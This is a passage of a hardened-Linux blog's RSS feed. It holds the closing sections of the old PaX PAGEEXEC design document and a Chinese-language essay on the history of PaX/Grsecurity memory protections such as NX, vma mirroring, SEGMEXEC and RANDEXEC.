&lt;pre&gt;&lt;code&gt;   &amp;lt;innocent&amp;gt; well, buffer overflows will be gone in 2-3 years 
   &amp;lt;innocent&amp;gt; hopefully
   &amp;lt;pax&amp;gt; sooner ;-)
   &amp;lt;pax&amp;gt; a month at most
   &amp;lt;innocent&amp;gt; what ??
   &amp;lt;innocent&amp;gt; you bullshitting me now or what ?
   &amp;lt;pax&amp;gt; just sit back and watch ;-)
   &amp;lt;pax&amp;gt; sure i do
   &amp;lt;pax&amp;gt; no ;-)
   &amp;lt;innocent&amp;gt; ok
   &amp;lt;innocent&amp;gt; phew
   &amp;lt;innocent&amp;gt; argh
   &amp;lt;innocent&amp;gt; you got me there for a second ;&amp;gt;
   &amp;lt;pax&amp;gt; heh, why?
   &amp;lt;innocent&amp;gt; coz I was in panic that there was something big coming up
   &amp;lt;innocent&amp;gt; it is already getting harder to find overflows now
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;on a more serious note, the PaX team would like to thank acpizer, dezzy
   and halvar for their support, help and testing the Linux version.&lt;/p&gt;

&lt;h3 id=&quot;contact-information&quot;&gt;7. contact information&lt;/h3&gt;

&lt;p&gt;The PaX Team &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#112;&amp;#097;&amp;#103;&amp;#101;&amp;#101;&amp;#120;&amp;#101;&amp;#099;&amp;#064;&amp;#102;&amp;#114;&amp;#101;&amp;#101;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#104;&amp;#117;&quot;&gt;&amp;#112;&amp;#097;&amp;#103;&amp;#101;&amp;#101;&amp;#120;&amp;#101;&amp;#099;&amp;#064;&amp;#102;&amp;#114;&amp;#101;&amp;#101;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#104;&amp;#117;&lt;/a&gt;
   PGP key fingerprint: D2E0 B4B6 16A3 B532 20B8  969B 956D 2366 39F0 81BF&lt;/p&gt;

&lt;p&gt;for participation in the Windows NT/2000 research/implementation contact
   Ice &amp;lt;white_ice@usa.net&amp;gt; or fOSSiL &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&quot;&gt;&amp;#102;&amp;#111;&amp;#115;&amp;#115;&amp;#097;&amp;#104;&amp;#064;&amp;#117;&amp;#115;&amp;#097;&amp;#046;&amp;#110;&amp;#101;&amp;#116;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;history&quot;&gt;8. history&lt;/h3&gt;

&lt;p&gt;2000.08.06 初始文档
   2000.10.01 PaX的Linux实现诞生
   2000.10.22 修复一些小错误
   2000.10.27 增加COW场景
   2000.10.28 完成Linux实现的描述
   2000.11.05 修复处理VM_IO，IPC共享内存变成NOEXEC等问题
   2000.11.16 修复pd/pt访问竞争条件问题&lt;/p&gt;

&lt;h3 id=&quot;footnotes&quot;&gt;9. footnotes&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;http://www.plex86.org/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;depending on where this data originates from (local or a remote host),
we talk about local and remote exploits, although the underlying problem
remains the same.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;http://www.plex86.org/news.phtml?id=3&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;we found it somewhat unfortunate how VM_STACK_FLAGS was defined. first,
its definition was not based on the existing symbolic constants but had
the raw hexadecimal value (so a simple ‘grep’ for ‘interesting’ symbols
would miss it whereas it is of crucial importance for determining the
protection flags for stack pages). second, its value included execution
permission which is of course exactly what we want to avoid. our patch
fixes at least the latter issue (holy lazyness ;-).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;for PPro+ processors when CR4.PSE is enabled the error code may also
indicate whether the fault occured due to some reserved bits in the
paging structures not being 0. in Linux (2.2.x at least) this can never
happen, hence its omission.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;see links at http://www.sandpile.org/ in the ‘impl’ section&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

</description>
        <pubDate>Mon, 25 May 2015 10:08:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/05/25/pageexec-old.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/05/25/pageexec-old.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>PaX的技术考古之旅</title>
        <description>&lt;p&gt;h4rdenedzer0会尝试翻译PaX/Grsecurity的一些文档，请关注。&lt;/p&gt;

&lt;h2 id=&quot;grsecuritypax&quot;&gt;0. 什么是Grsecurity/PaX?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://pax.grsecurity.net/&quot;&gt;PaX&lt;/a&gt;是针对linux kernel的一个加固版本的补丁，它让linux内核的内存页受限于
最小权限原则，是这个星球上有史以来最极端和最优秀的防御系统级别0day的方
案，第1版的设计和实现诞生于2000年，那可是一个没有
ASLR/RELRO/NX/CANARY/FORITY/PIE都没有的年代，这些今天意义上的现代
mitigation技术不管是linux/windows/macosx都多少抄袭和模仿了PaX的设计和实
现，但有很多朋友会问：既然这东东这么厉害，为什么不在linux mainline里？
PaX没有进入Linux内核upstream的原因不止一个，甚至有时候都不是纯粹技术本身的问题：&lt;/p&gt;

&lt;p&gt;1) &lt;a href=&quot;http://unix.stackexchange.com/questions/59020/why-are-the-grsecurity-patches-not-included-in-the-vanilla-kernel&quot;&gt;PaX Team并不在意PaX是否进入Linux主干代码&lt;/a&gt;，但多年来有很多关心Linux内核安全的人不断的尝试把PaX的代码分拆成小的patch提交给Linux内核社区。&lt;/p&gt;

&lt;p&gt;2) Linux内核社区认为PaX的代码难以维护，而Linux内核社区更喜欢花时间在性能和新功能上，而非安全。&lt;/p&gt;

&lt;p&gt;3) Linux内核社区和Linux基金会受到由各个大厂商的影响，大厂商对于安全的要求取决于他们的客户的需求，如果很多真相不曝光大厂商是不会在意安全性的&lt;/p&gt;

&lt;p&gt;4) 商业公司在意他们的主要利润来源，比如Five-eyes国家（美国，英国，加拿大，澳大利亚和新西兰）的政府项目都会统一采购SELinux的项目，所以大厂商都会花费精力去满足这一需求，这也是SELinux虽然备受争议但是一直有厂商和NSA持续投入的原因。&lt;/p&gt;

&lt;p&gt;SELinux也是一个著名的开源MAC（强制访问控制）实现，是由NSA(美国国家安全局）于1990年代末发起的项目，于2000年以GPL自由软件许可证开放源代码，2003年&lt;a href=&quot;http://www.internetnews.com/ent-news/article.php/3317331&quot;&gt;合并到Linux内核中&lt;/a&gt;，过去10年中关于&lt;a href=&quot;https://www.schneier.com/blog/archives/2008/04/nsas_linux.html&quot;&gt;是否NSA在其中放后门的争论&lt;/a&gt;没有停过，一些人认为应该信任SELinux，因为它是以GPL自由软件许可证公开的源代码，也有人认为它是NSA参与过的项目，所以不应该信任。2013年Snowden曝光棱镜后更多的人极度的不信任NSA，认为&lt;a href=&quot;http://www.zerohedge.com/news/2013-07-09/nsa-has-inserted-its-code-android-os-bugging-three-quarters-all-smartphones&quot;&gt;NSA有对Android代码植入后门的前科&lt;/a&gt;，所以应该&lt;a href=&quot;http://www.eteknix.com/nsa-has-code-running-in-the-linux-kernel-and-android/&quot;&gt;怀疑所有NSA积极参与的项目包括SELinux&lt;/a&gt;。目前MAC的开源实现里，SELinux主要由RedHat/CentOS/Fedora社区维护，Apparmor主要由OpenSuSE/Ubuntu社区维护，关于SELinux是否应该使用是一个长久争论的话题，个人认为这取决于你的威胁建模，如果你是Five-Eyes阵营你当然应该使用SELinux，如果你是其他阵营比如德国或者中国，或许你应该考虑其他选择。&lt;/p&gt;

&lt;p&gt;针对Linux内核的MAC实现都是基于LSM( Linux Security Module)去实现的，LSM利用了一堆CAPABILITY的
机制提供了一些限制用户态程序访问控制的接口，SELinux和Apparmor都是基于LSM开发的，注意LSM并不是一个传统意义上的linux kernel module，至少在2个地方不同于普通module:&lt;/p&gt;

&lt;p&gt;1) 必须在bootloader启动内核时启动，不能在内核加载完后启动。&lt;/p&gt;

&lt;p&gt;2) 不能同时启动2个LSM的实现。&lt;/p&gt;

&lt;p&gt;但PaX Team是一群old school security hackers，他们认为LSM一方面打破了
“security as a whole”的哲学，另外一方面对于&lt;a href=&quot;https://grsecurity.net/compare.php&quot;&gt;内核漏洞没有防御能力&lt;/a&gt;，虽然在早年Linux内核社区以及大厂商不管是刻意还是无意的想要掩盖这一点，但&lt;a href=&quot;https://grsecurity.net/spender_summit.pdf&quot;&gt;时间&lt;/a&gt;证明PaX Team是正确的。其
实当人们谈到Gnu/Linux安全性比windows/OSX更好时，其实未必，至少linux内核社区并没有把安全性放在首位，Linus Torvalds从来都不是太care安全问题，不是吗？&lt;/p&gt;

&lt;p&gt;PaX从一开始就主要关注如何防御和检测memory corruption，PaX由PaX team维护，Grsecurity主要包括了RBAC（基于角色的访问控制）和一系列对PaX的改进，Grsecurity主要由Spender维护，最近几年这2组Patch都合并到了一起发布，所以我们都称这组补丁为Grsecurity/PaX或者PaX/Grsecurity。&lt;/p&gt;

&lt;h2 id=&quot;pax&quot;&gt;0.1 PaX的诞生&lt;/h2&gt;

&lt;p&gt;这个section描述的是这篇“过时”的&lt;a href=&quot;https://pax.grsecurity.net/docs/pageexec.old.txt&quot;&gt;论文&lt;/a&gt;，这是PaX的Genesis，1999年7月的
&lt;a href=&quot;http://www.plex86.org/&quot;&gt;plex86社区&lt;/a&gt;(old school虚拟化社区之一)打算验证一个概念，当时Pentium(包
括P6family)处理器新增加了一个功能，就是CPU把TLB区分为DTLB(数据TLB)和
ITLB(指令TLB)，TLB主要是PTE( page table entries)的缓存，因此存放着
user/kernel spaces的访问权限信息，在正常的情况下，ITLB和DTLB entries从
相同的PTE里读出相同的状态，但如果状态有所改变的话也就意味着可以把数据读
写和代码执行分开，如果这个POC能成功也就意味着可以对抗缓冲区溢出的最佳方
案，这个成为了今天的NX=&amp;gt;要么可读写要么可执行。&lt;/p&gt;

&lt;p&gt;在PaX的初始设计文档中经过了对PTE中的2个flags的分析：&lt;/p&gt;

&lt;p&gt;Present位，如果设置1，指向的page(或者page table)是存在于内存里的；如果
设置为0，page没有在内存里和保存的入口位(bits)可能会被OS用作其他用途。如
果page table或者page directory的入口需要执行地址转换(线性地址到物理地
址)时Present位被清0，会产生一个异常:page fault异常。&lt;/p&gt;

&lt;p&gt;U/S位，权限管理，U-&amp;gt;user space, S-&amp;gt;kernel space&lt;/p&gt;

&lt;p&gt;关于ITLB和DTLB的状态之间的转换这篇paper里已经有非常详细的描述，这里就不
多阐述了，linux内核的实现问题，虚拟内存管理的主要结构是vm_area_struct，
主要是描述连续的线性地址的一些属性包括
READ/WRITE/EXECUTE/SHARED/PRIVATE等，里面有2个结构体成员需要关注：
vm_flags，vm_page_prot。PaX在出现page fault的时候多增加了一些动作包括模
拟page table entry里的可访问U标志位和在模拟PTE中检查访问权限。&lt;/p&gt;

&lt;p&gt;PaX的第一版的副作用也不小，
1，用户态可执行的栈是不可能的
2，性能损耗在5%–8%&lt;/p&gt;

&lt;p&gt;old school社区plex86在1999年的一个概念验证建立了后来NX(目前是硬件支持)
的基础，个人觉得最有意思的地方是防御缓冲区溢出利用最早的策略是基于对于
TLB的研究导致的，这听起来怎么那么像emerging property, Out of C0ntrol?
KK? Ring the bell?&lt;/p&gt;

&lt;h2 id=&quot;pax-1&quot;&gt;1. 2003年PaX谈”未来”&lt;/h2&gt;

&lt;p&gt;PaX在2003年的时候开始思考如何在[未来&lt;a href=&quot;https://pax.grsecurity.net/docs/pax-future.txt&quot;&gt;(2003以后)在根本上根除漏洞利用&lt;/a&gt;，PaX
对于W-xor-X的实现非常奏效，具体在&lt;a href=&quot;https://pax.grsecurity.net/docs/pageexec.old.txt&quot;&gt;PAGEEXEC原始设计文档&lt;/a&gt;里已经有所描述。&lt;/p&gt;

&lt;p&gt;从defensive的平面来看，当时GNU/Linux平台主要依赖PaX的patch来进行加固(包
括ASLR)，ASLR和NX进入linux内核mainstream是后来的事情，OpenBSD和Windows
XP SP2和OSX 10.5也加入了NX，但都是抄袭PaX的设计(或许也包括实现)，&lt;/p&gt;

&lt;p&gt;从offensive的平面来看，2003年的背景是stack-based overflow和string
format vuln已经泛滥，但ROP还没有大规模的流行，但old school社区对于ROP的
研究已经有相当的研究，包括Solar Designer在1997年发到&lt;a href=&quot;http://seclists.org/bugtraq/1997/Aug/63&quot;&gt;bugtraq里的讨论&lt;/a&gt;，之后更精彩的paper是在2001年&lt;a href=&quot;http://phrack.org/archives/issues/58/4.txt&quot;&gt;Phrack Issue 58的那篇论文”The advanced return-into-lib(c) exploits: PaX case study”&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;注意：2003年时SK的那篇Borrowed code chunks还没有发布。&lt;/p&gt;

&lt;p&gt;2003年，PaX team认为会导致漏洞利用的bug给予了攻击者(区分攻击者和黑客是
不同的term)在3个不同层面上访问被攻击的进程：&lt;/p&gt;

&lt;p&gt;(1) 执行任意代码
(2) 执行现有代码但打破了原有的执行顺序
(3) 原有的执行顺序执行现有代码，但加载任意数据&lt;/p&gt;

&lt;p&gt;NOEXEC( Non-executable pages)和MPROTECT(mmap/mprotect)能防御(1)，但有一
种情况是例外：如果攻击者能创建和写入一个文件然后mmap()到被攻击的进程空
间里，这样可以执行任意的代码。&lt;/p&gt;

&lt;p&gt;ASLR在一定程度上降低了(1),(2),(3)的风险，但如果内核有信息泄露的bug例外。
PaX team在当时就认为把内核当成可信计算( Trusted Computing)的基础是一件
可笑的事情，因为内核跟用户空间一样容易遭受各种攻击。所以他们认为”未来”
需要做一些事情(注：这些事情今天都已经搞定）：&lt;/p&gt;

&lt;p&gt;(a) 尝试处理(1)不能处理的那个例外情况
(b) 实现所有可能在内核态自己的防御机制
(c) 为(2)实现确定性( deterministic)防护，可能也为(3)实现类似的机制
(d) 为(2)实现概率行( probalilistic)防护以实现阻止信息泄露&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;处理(a)更好的解决方案是使用访问控制和可信路径执行来限制，Grsecurity今
天就是这么做的
—————————————————&lt;/p&gt;

&lt;p&gt;之后这篇文档里详细的罗列了针对(a)(b)(c)(d)需要去实现的加固方案。在&lt;a href=&quot;https://raw.githubusercontent.com/citypw/security-regression-testing-for-suse/master/other/vulns_hardening_assessment.log&quot;&gt;这里已经能看出一些后来出现的mitigation技术&lt;/a&gt;：Stack Canary, RELRO,
pointer constant/encryption?&lt;/p&gt;

&lt;h2 id=&quot;paxvma-mirroring&quot;&gt;1.1 2003年PaX里vma mirroring的设计&lt;/h2&gt;

&lt;p&gt;在2003年的晚些时候PaX实现了&lt;a href=&quot;https://pax.grsecurity.net/docs/vmmirror.txt&quot;&gt;虚拟内存空间的镜像( vma mirroring)&lt;/a&gt;，vma
mirroring的目的是为了在一组物理页上做特殊文件隐射时有2个不同的线性地址，
这2个地址即使在swap-out/swap-in或者COW后依然是不会改变的。这样做的目的
为了满足几种场景：&lt;/p&gt;

&lt;p&gt;1，把可执行的区域在使用SEGMEXEC隐射进入代码段。在32-bit的linux内核里的
4GB地址空间是其中3GB给用户空间，1GB给内核空间，而vma mirroring把用户空
间的3GB划分成了2个1.5GB分别是给代码段和数据段，在可执行区域里包含的数据
的部分(常量字符串，函数指针表等)都会mirroring到数据段里。&lt;/p&gt;

&lt;p&gt;2，实现可执行区域的地址随机化( RANDEXEC)。&lt;/p&gt;

&lt;p&gt;3，这个引出了第3种情况，就是SEGMEXEC和RANDEXEC同时激活，个人觉得这个的
效果应该和PIE＋ASLR的效果类似，不同的不是整个elf binary的代码段随机化，
而是在mirroring时对代码段和数据段进行随机化。&lt;/p&gt;

&lt;p&gt;之后这篇文章开始聊到实现的问题，对于一个普通的用户态binary在执行后，内
核得做一系列的工作，fs/binfmt_elf.c里的load_elf_binary()负责进程地址空
间的一些基本的映射包括stack,动态连接器和binary本身。而文件的映射是通过
elf_map()调用do_mmap()完成的。用户态binary的第1条指令从ld.so或者binary
自己fetch到后会raise一个page fault，linux内核内存管理是按需分配内存的，
所以在binary刚执行时是没有建立有效的物理映射的。x86架构的page fault
handler在arch/i386/mm/fault.c文件里的do_page_fault()去找到vma结构体，
VMA里包含了物理页的数据(ELF文件里的代码段, etc)。&lt;/p&gt;

&lt;p&gt;当时的PaX的做法大致是这样的，vma mirror是根据已经内存映射mmap()后的地址，
用户态通过mmap()是无法直接去做vma mirror请求的，所有的mmap()请求多会经
过include/linux/mm.h的do_map()，PaX扩展( SEGMEXEC)也是在这个地方处理，
原始内核通过调用do_mmap_pgoff()来调用do_mmap()，PaX在这里为了确保
SEGMEXEC能知道来自用户态和内核态的原生文件映射请求所以略过
do_mmap_pgoff()而直接调用do_mmap()，而vma mirror请求使用一些特殊参数传
递给do_mmap_pgoff():&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;'file'    必须是NULL，因为mirror会引用相同文件的vma作为镜像
'addr'    正常使用
'len'    必须是0
‘prot'    正常使用
'flags'    正常使用，除了一种情况：指定MAP_MIRROR和只能指定private映射
'pgoff'    指定vma的线性起始地址作为镜像
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;文章给出了一个例子：&lt;/p&gt;

&lt;p&gt;# cp /bin/cat /tmp/
# /tmp/cat /proc/self/maps&lt;/p&gt;

&lt;p&gt;激活PaX的2个功能: SEGMEXEC, MPROTECT&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1] 08048000-0804a000 R-Xp 00000000 00:0b 1109       /tmp/cat
[2] 0804a000-0804b000 RW-p 00002000 00:0b 1109       /tmp/cat
[3] 0804b000-0804d000 RW-p 00000000 00:00 0
[4] 20000000-20015000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
[5] 20015000-20016000 RW-p 00014000 03:07 110818     /lib/ld-2.2.5.so
[6] 2001e000-20143000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
[7] 20143000-20149000 RW-p 00125000 03:07 106687     /lib/libc-2.2.5.so
[8] 20149000-2014d000 RW-p 00000000 00:00 0
[9] 5fffe000-60000000 RW-p fffff000 00:00 0    [10] 68048000-6804a000 R-Xp 00000000 00:0b 1109       /tmp/cat    [11] 80000000-80015000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so    [12] 8001e000-80143000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个binary是一个动态连接的可执行程序，所以在执行时会映射其他的库文件。&lt;/p&gt;

&lt;p&gt;[1] 这个binary文件/tmp/cat的第1个PT-LOAD段映射为有读和执行的权限，包含
了可执行的代码和只读的初始化后的数据。因为是可执行的所以被[10]镜像。&lt;/p&gt;

&lt;p&gt;[2] 第2个PT_LOAD段，映射为读写权限，包含了可写的数据(所有初始化和没有初
始化的)&lt;/p&gt;

&lt;p&gt;[3] brk()管理的堆，在运行时会根据malloc()/free()来调整大小&lt;/p&gt;

&lt;p&gt;[4][5] 动态连接器&lt;/p&gt;

&lt;p&gt;[6][7] C库 ，[4][6]被映射到了[11][12]，因为他们是可执行的。&lt;/p&gt;

&lt;p&gt;[8] 一个针对C库的初始化数据的匿名映射&lt;/p&gt;

&lt;p&gt;[9] 一个匿名映射包含了stack。我们能观察到这个地址在用户空间的数据部分的
结束地址，开启SEGMEXEC后是TASK_SIZE/2。&lt;/p&gt;

&lt;p&gt;[10][11][12] 分别映射可执行镜像[1][4][6]。&lt;/p&gt;

&lt;p&gt;激活PaX的3个功能的情况: SEGMEXEC，RANDEXEC，MPROTECT&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1] 08048000-0804a000 R-Xp 00000000 00:0b 1109       /tmp/cat
[2] 0804a000-0804b000 RW-p 00002000 00:0b 1109       /tmp/cat
    0804b000-0804d000 RW-p 00000000 00:00 0
[3] 20000000-20002000 ++-p 00000000 00:00 0
[4] 20002000-20003000 RW-p 00002000 00:0b 1109       /tmp/cat
    20003000-20018000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
    20018000-20019000 RW-p 00014000 03:07 110818     /lib/ld-2.2.5.so
    20021000-20146000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
    20146000-2014c000 RW-p 00125000 03:07 106687     /lib/libc-2.2.5.so
    2014c000-20150000 RW-p 00000000 00:00 0
[5] 5fffe000-60000000 RW-p 00000000 00:00 0
[6] 80000000-80002000 R-Xp 00000000 00:0b 1109       /tmp/cat
    80003000-80018000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
    80021000-80146000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;RANDEXEC有一些改变，[3]成了第1个可执行的PT_LOAD段的匿名映射，[4]成为第
2个PT_LOAD段的的mirror，[2]和[4]有相同的页偏移值，文档说[1]被[6]给
mirror后是超出了TASK/SIZE/2的范围，但个人觉得这个地方是代码段的区域所以
必然是在1.5G以上(如果数据段在0-1.5G的话)，还有就是在RANDUSTACK开启后由
于stack的第1部分不能关闭随机化，所以多比第1个例子多占了1个page，这个怎
么得出的呢？靠我真不知道，可能是fffff000 xor ffffffff = fff来的？&lt;/p&gt;

&lt;p&gt;激活PaX的3个功能的情况: PAGEEXEC, RANDEXEC, MPROTECT&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[1] 08048000-0804a000 R--p 00000000 00:0b 1109       /tmp/cat
[2] 0804a000-0804b000 RW-p 00002000 00:0b 1109       /tmp/cat
    0804b000-0804d000 RW-p 00000000 00:00 0
[3] 40000000-40002000 R-Xp 00000000 00:0b 1109       /tmp/cat
[4] 40002000-40003000 RW-p 00002000 00:0b 1109       /tmp/cat
    40003000-40018000 R-Xp 00000000 03:07 110818     /lib/ld-2.2.5.so
    40018000-40019000 RW-p 00014000 03:07 110818     /lib/ld-2.2.5.so
    40021000-40146000 R-Xp 00000000 03:07 106687     /lib/libc-2.2.5.so
    40146000-4014c000 RW-p 00125000 03:07 106687     /lib/libc-2.2.5.so
    4014c000-40150000 RW-p 00000000 00:00 0
    bfffe000-c0000000 RW-p fffff000 00:00 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最后的这种情况是vma mirroring所产生最简单的内存layout，只有binary本生被
镜像了，[1]被[3]，[2]被[4]镜像了。注意[1]没有R-X权限了，在PAGEEXEC下只
有R–。&lt;/p&gt;

&lt;p&gt;虽然现在的PaX实现肯定不是这个设计的版本，但读读原始的paper会有一些意想
不到的收获，也算技术进化考古的过程了;-)&lt;/p&gt;

&lt;h2 id=&quot;ld-sch00l&quot;&gt;2. 0ld sch00l黑客的出埃及记&lt;/h2&gt;

&lt;p&gt;Grsecurity/PaX目前&lt;a href=&quot;https://grsecurity.net/the_case_for_grsecurity.pdf&quot;&gt;应用广泛&lt;/a&gt;，特别是具有高安全性的环境，Gnu/Linux发行版里
Gentoo提供PaX作为加固选项，最近半年Debian社区发起的对抗大规模监控的加固
项目&lt;a href=&quot;http://mempo.org/&quot;&gt;Mempo&lt;/a&gt;在内核中也使用了Grsecurity/PaX。&lt;/p&gt;

&lt;p&gt;这篇文章仅仅是在学习PaX的3篇paper里的记录，PaX的思路的确非常的震撼，那
都是10多年前的设计和实现，在这个一天云计算一天雾计算的年代，虽然关注本
质的黑客越来越少，但地下精神并未死去，PaX Team就是一个活生生的例证，相
反，不少old school黑客都坚信其实old school的数量并没有减少，至少我个人
相信这是真的…Phrack没死，Grsecurity/PaX没死，DNFWAH也没死，希望更多的
黑客分享自己的hacking之旅。&lt;/p&gt;

&lt;p&gt;Phrack is not dead, Grsecurity/PaX is not dead, DNFWAH is not dead,
The Underground spirit is not dead…..If they were, that’d be on us!&lt;/p&gt;

&lt;p&gt;=——————————————————————–=&lt;/p&gt;

&lt;p&gt;To one of the most respected old school communities:
Grsecurity/PaX. We/I salute you!!!&lt;/p&gt;

</description>
        <pubDate>Sun, 24 May 2015 03:20:45 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/05/24/archeological_hacking_on_pax.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/05/24/archeological_hacking_on_pax.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
  </channel>
</rss>
